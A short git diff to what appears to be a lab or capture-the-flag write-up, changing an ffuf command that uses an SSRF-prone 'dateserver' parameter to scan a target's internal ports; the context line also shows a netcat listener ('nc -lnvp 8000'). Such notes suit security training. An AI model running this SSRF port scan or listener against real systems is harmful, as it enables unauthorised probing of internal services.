@@ -17,7 +17,7 @@ nc -lnvp 8000
 
 ### Enumerating the System
 ```bash
-ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+ffuf -w /usr/share/wordlists/ports-1-65535.txt -u http://10.129.83.100 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -mr "Date is unavailable. Please choose a different date!"
 ```
 
 ## Explotation
